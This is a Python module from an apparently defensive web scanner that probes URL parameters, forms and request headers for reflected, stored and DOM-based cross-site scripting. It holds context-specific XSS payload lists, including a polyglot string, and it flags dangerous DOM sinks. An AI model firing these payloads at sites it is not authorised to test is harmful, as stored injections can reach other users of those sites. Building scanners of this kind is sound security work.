import re
import uuid
import httpx
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import get_url_params, inject_url_param, fetch
from scanner.utils.payloads import load_payloads

_HARDCODED_CONTEXT_PAYLOADS = {
    "html": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<script>alert(1)</script>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
    ],
    "attribute": [
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onmouseover="alert(1)"',
        '"><img src=x onerror=alert(1)>',
        "' onmouseover='alert(1)'",
    ],
    "js": [
        '";alert(1)//',
        "';alert(1)//",
        "`};alert(1)//",
        "\n};alert(1)\n//",
        '"-alert(1)-"',
    ],
    "comment": [
        "--><script>alert(1)</script><!--",
        "--><img src=x onerror=alert(1)><!--",
    ],
    "unknown": [
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert())//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/oNloAd=alert()//",
    ],
}

def _load_context_payloads() -> dict:
    data = load_payloads("xss")
    if not data or not isinstance(data, dict):
        return _HARDCODED_CONTEXT_PAYLOADS
    result = dict(_HARDCODED_CONTEXT_PAYLOADS)
    for ctx in ("html", "attribute", "js", "comment", "unknown"):
        if isinstance(data.get(ctx), list) and data[ctx]:
            result[ctx] = data[ctx]
    return result

# Context-specific payloads — chosen AFTER detecting where the input lands
CONTEXT_PAYLOADS = _load_context_payloads()

REFLECTIVE_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For"]

# DOM XSS sink patterns
DOM_XSS_SINKS = [
    re.compile(r'document\.write\s*\(', re.IGNORECASE),
    re.compile(r'\.innerHTML\s*=', re.IGNORECASE),
    re.compile(r'\.outerHTML\s*=', re.IGNORECASE),
    re.compile(r'eval\s*\(', re.IGNORECASE),
    re.compile(r'location\.hash', re.IGNORECASE),
    re.compile(r'location\.search', re.IGNORECASE),
    re.compile(r'document\.URL', re.IGNORECASE),
    re.compile(r'window\.location', re.IGNORECASE),
]


def test(page: CrawlResult, client: httpx.Client) -> List[Finding]:
    findings = []
    _test_url_params(page, client, findings)
    _test_forms(page, client, findings)
    _test_headers(page, client, findings)
    _check_dom_xss(page, findings)
    return findings


# --- Context detection ---

def _detect_context(body: str, marker: str) -> str:
    """Detect where the marker landed in the response body."""
    pos = body.find(marker)
    if pos == -1:
        return "unknown"

    prefix = body[max(0, pos - 600):pos]

    # JS context: last <script> opener without a matching </script>
    last_script_open = prefix.rfind("<script")
    last_script_close = prefix.rfind("</script")
    if last_script_open != -1 and last_script_open > last_script_close:
        return "js"

    # Comment context: last <!-- without matching -->
    last_comment_open = prefix.rfind("<!--")
    last_comment_close = prefix.rfind("-->")
    if last_comment_open != -1 and last_comment_open > last_comment_close:
        return "comment"

    # Attribute context: marker is inside an attribute value (preceded by = and an open quote)
    local_prefix = body[max(0, pos - 80):pos]
    if re.search(r'''=["'][^"'<>]*$''', local_prefix):
        return "attribute"

    return "html"


# --- URL parameter testing ---

def _test_url_params(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    params = get_url_params(page.url)
    for param_name in params:
        # Step 1: probe context with a unique marker
        marker = f"ksgsc{uuid.uuid4().hex[:8]}ksgsc"
        probe_url = inject_url_param(page.url, param_name, marker)
        probe_resp = fetch(client, "get", probe_url)
        if not probe_resp:
            continue

        context = _detect_context(probe_resp.text, marker)
        payloads = CONTEXT_PAYLOADS.get(context, CONTEXT_PAYLOADS["unknown"])

        for payload in payloads:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            if resp and payload in resp.text:
                findings.append(_finding(
                    page.url, param_name, payload,
                    f"Reflected XSS ({context} context)",
                ))
                break


# --- Form testing ---

def _test_forms(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    for form in page.forms:
        input_names = [inp["name"] for inp in form["inputs"] if inp["name"]]
        if not input_names:
            continue

        # Step 1: probe context with a unique marker
        marker = f"ksgsc{uuid.uuid4().hex[:8]}ksgsc"
        probe_data = {name: marker for name in input_names}
        probe_resp = fetch(client, form["method"], form["action"], probe_data)
        if not probe_resp:
            continue

        context = _detect_context(probe_resp.text, marker)
        payloads = CONTEXT_PAYLOADS.get(context, CONTEXT_PAYLOADS["unknown"])

        for payload in payloads:
            data = {name: payload for name in input_names}
            resp = fetch(client, form["method"], form["action"], data)
            if resp and payload in resp.text:
                findings.append(_finding(
                    form["action"], input_names[0], payload,
                    f"Reflected XSS ({context} context)",
                ))
                break
            # Stored XSS check: re-fetch the source page to see if payload persisted
            elif resp:
                stored_resp = fetch(client, "get", page.url)
                if stored_resp and payload in stored_resp.text:
                    findings.append(_finding(
                        page.url, input_names[0], payload,
                        "Stored XSS",
                        severity=Severity.CRITICAL,
                    ))
                    break


# --- Header reflection ---

def _test_headers(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    payload = "<script>alert(1)</script>"
    for header in REFLECTIVE_HEADERS:
        try:
            resp = client.get(page.url, headers={header: payload})
        except Exception:
            continue
        if payload in resp.text:
            findings.append(_finding(page.url, header, payload, "Header-Based Reflected XSS"))


# --- DOM XSS static analysis ---

def _check_dom_xss(page: CrawlResult, findings: List[Finding]):
    # Check both page body and intercepted JS network requests (from Playwright crawler)
    js_sources = [page.body] + list(getattr(page, "network_requests", []))

    for source in js_sources:
        for pattern in DOM_XSS_SINKS:
            if pattern.search(source):
                findings.append(Finding(
                    title="Potential DOM-Based XSS Sink Detected",
                    severity=Severity.MEDIUM,
                    url=page.url,
                    parameter=None,
                    payload=None,
                    evidence=f"DOM XSS sink pattern '{pattern.pattern}' found in page JavaScript",
                    description=(
                        "DOM-based XSS occurs when JavaScript uses attacker-controlled data "
                        "(e.g., location.hash, location.search) as input to dangerous sinks "
                        "like document.write or innerHTML."
                    ),
                    remediation=(
                        "Avoid dangerous sinks. Use textContent instead of innerHTML. "
                        "Sanitize DOM inputs with DOMPurify. "
                        "Implement a strict Content-Security-Policy."
                    ),
                    cwe="CWE-79",
                    cvss=5.4,
                    owasp_category="A03:2021 Injection",
                    standards=["ISO27001-8.23", "GDPR-Art32"],
                    confidence=0.5,
                ))
                break  # one DOM XSS indicator per source is enough
        else:
            continue
        break  # stop after first matching source


def _finding(
    url: str,
    param: str,
    payload: str,
    label: str,
    severity: Severity = Severity.HIGH,
) -> Finding:
    is_stored = "Stored" in label
    return Finding(
        title=f"Cross-Site Scripting (XSS) — {label}",
        severity=severity,
        url=url,
        parameter=param,
        payload=payload,
        evidence=(
            "Payload persisted and was reflected on a subsequent page load"
            if is_stored else
            "Payload reflected verbatim in the response body"
        ),
        description=(
            "Stored XSS allows attackers to permanently inject malicious scripts visible to all users."
            if is_stored else
            "XSS allows attackers to inject malicious scripts into web pages viewed by other users, "
            "enabling session theft, credential harvesting, and defacement."
        ),
        remediation=(
            "HTML-encode all user-supplied output. "
            "Implement Content-Security-Policy. "
            "Use framework-level output encoding (Django templates, React JSX auto-escaping)."
        ),
        cwe="CWE-79",
        cvss=9.3 if is_stored else 6.1,
        owasp_category="A03:2021 Injection",
        standards=["ISO27001-8.23", "HIPAA-164.312a", "GDPR-Art32"],
        confidence=1.0,
    )
